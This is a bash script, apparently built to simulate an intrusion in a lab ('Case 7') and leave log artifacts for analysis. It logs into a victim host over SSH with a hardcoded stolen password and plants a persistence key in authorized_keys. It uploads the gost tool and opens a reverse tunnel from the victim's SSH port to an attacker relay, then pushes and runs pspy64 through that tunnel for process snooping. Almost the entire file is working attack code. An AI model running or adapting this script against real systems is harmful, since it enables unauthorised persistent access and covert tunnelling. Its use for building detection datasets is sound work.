#!/usr/bin/env bash

set -euo pipefail

# ================================================
# Case 7 paths
# ================================================

ATTACK_HOME="/opt/case7"

ROLE_FILE="${ATTACK_HOME}/lab_roles_ip.txt"
LOCAL_GOST_PATH="${ATTACK_HOME}/gost"
LOCAL_PSPY_PATH="${ATTACK_HOME}/pspy64"
PERSIST_KEY="${ATTACK_HOME}/keys/case7_persistence_key"

# ================================================
# Compromised account
# ================================================

COMPROMISED_USER="ariadne"
COMPROMISED_PASS="4d853d07751c05e2b915ea16c4170cf7"

# ================================================
# Checks
# ================================================

if [[ ! -d "${ATTACK_HOME}" ]]; then
  echo "ERROR: attack directory not found: ${ATTACK_HOME}" >&2
  exit 1
fi

if [[ ! -f "${ROLE_FILE}" ]]; then
  echo "ERROR: role file not found: ${ROLE_FILE}" >&2
  exit 1
fi

if [[ ! -x "${LOCAL_GOST_PATH}" ]]; then
  echo "ERROR: local gost binary not found or not executable: ${LOCAL_GOST_PATH}" >&2
  exit 1
fi

if [[ ! -x "${LOCAL_PSPY_PATH}" ]]; then
  echo "ERROR: local pspy64 binary not found or not executable: ${LOCAL_PSPY_PATH}" >&2
  exit 1
fi

if [[ ! -f "${PERSIST_KEY}" ]]; then
  echo "ERROR: persistence key not found: ${PERSIST_KEY}" >&2
  exit 1
fi

if [[ ! -f "${PERSIST_KEY}.pub" ]]; then
  echo "ERROR: persistence public key not found: ${PERSIST_KEY}.pub" >&2
  exit 1
fi

if ! command -v sshpass >/dev/null 2>&1; then
  echo "ERROR: sshpass command not found" >&2
  exit 1
fi

VICTIM_IP="$(awk -F= '$1=="role_1"{print $2}' "${ROLE_FILE}")"
ATTACKER_IP="$(awk -F= '$1=="role_2"{print $2}' "${ROLE_FILE}")"

if [[ -z "${VICTIM_IP}" ]]; then
  echo "ERROR: role_1 IP not found in ${ROLE_FILE}" >&2
  exit 1
fi

if [[ -z "${ATTACKER_IP}" ]]; then
  echo "ERROR: role_2 IP not found in ${ROLE_FILE}" >&2
  exit 1
fi

# ================================================
# Local GOST relay on attacker
# ================================================
# На r2 ничего не пишем: ни .pid, ни log-файлы.

nohup "${LOCAL_GOST_PATH}" -L "relay://${ATTACKER_IP}:9002?bind=true" >/dev/null 2>&1 < /dev/null &

sleep 2

# ================================================
# Initial SSH access and persistence
# ================================================

sshpass -p "${COMPROMISED_PASS}" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  "${COMPROMISED_USER}@${VICTIM_IP}" \
  'cat >> ~/.ssh/authorized_keys' \
  < "${PERSIST_KEY}.pub"

# ================================================
# Transfer GOST to victim
# ================================================

sshpass -p "${COMPROMISED_PASS}" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  "${COMPROMISED_USER}@${VICTIM_IP}" \
  "mkdir -p ~/.local/bin"

sshpass -p "${COMPROMISED_PASS}" scp \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  "${LOCAL_GOST_PATH}" \
  "${COMPROMISED_USER}@${VICTIM_IP}:/home/${COMPROMISED_USER}/.local/bin/gost"

sshpass -p "${COMPROMISED_PASS}" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  "${COMPROMISED_USER}@${VICTIM_IP}" \
  "chmod +x ~/.local/bin/gost"

# ================================================
# Remote GOST client on victim
# ================================================
# На жертве лог оставляем как реалистичный артефакт атаки.

sshpass -p "${COMPROMISED_PASS}" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  "${COMPROMISED_USER}@${VICTIM_IP}" \
  "nohup ~/.local/bin/gost -L rtcp://127.0.0.1:2223/127.0.0.1:22 -F relay://${ATTACKER_IP}:9002 > ~/gost-client.log 2>&1 < /dev/null &"

sleep 3


# ================================================
# Transfer pspy64 through GOST tunnel
# ================================================

ssh \
  -i "${PERSIST_KEY}" \
  -p 2223 \
  -o BatchMode=yes \
  -o PasswordAuthentication=no \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  "${COMPROMISED_USER}@127.0.0.1" \
  "mkdir -p ~/.local/bin"

scp \
  -i "${PERSIST_KEY}" \
  -P 2223 \
  -o BatchMode=yes \
  -o PasswordAuthentication=no \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  "${LOCAL_PSPY_PATH}" \
  "${COMPROMISED_USER}@127.0.0.1:/home/${COMPROMISED_USER}/.local/bin/pspy64"

ssh \
  -i "${PERSIST_KEY}" \
  -p 2223 \
  -o BatchMode=yes \
  -o PasswordAuthentication=no \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  "${COMPROMISED_USER}@127.0.0.1" \
  "chmod +x ~/.local/bin/pspy64"

# ================================================
# Run pspy64 on victim
# ================================================
# На жертве pspy.log оставляем как артефакт для анализа.

ssh \
  -i "${PERSIST_KEY}" \
  -p 2223 \
  -o BatchMode=yes \
  -o PasswordAuthentication=no \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  "${COMPROMISED_USER}@127.0.0.1" \
  "nohup ~/.local/bin/pspy64 -pf -i 1000 > ~/pspy.log 2>&1 < /dev/null &"
